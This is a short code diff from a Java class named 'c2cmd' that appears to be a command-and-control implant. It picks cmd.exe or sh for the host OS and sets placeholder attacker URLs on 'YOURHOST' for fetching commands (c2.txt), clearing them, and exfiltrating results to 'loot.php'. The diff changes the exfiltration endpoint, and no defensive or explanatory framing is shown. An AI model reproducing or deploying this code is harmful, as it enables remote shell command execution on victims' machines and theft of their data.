@@ -11,7 +11,7 @@ public class c2cmd{
 	Timer timer = new Timer("TaskName");
 	String exe = System.getProperty("os.name").toLowerCase().contains("windows") ? "cmd.exe" : "sh";
 	String swtch = System.getProperty("os.name").toLowerCase().contains("windows") ? "/C" : "-c";
-	public String url = "https://YOURHOST_OR_BURPCOLLABORATOR/Exfil";
+	public String url = "https://YOURHOST/exploit/c2/loot.php";
 	public String clearcheck = "https://YOURHOST/exploit/c2/2c.php?get=1";
 	public String cmdcheck = "https://YOURHOST/exploit/c2/c2.txt";
 	
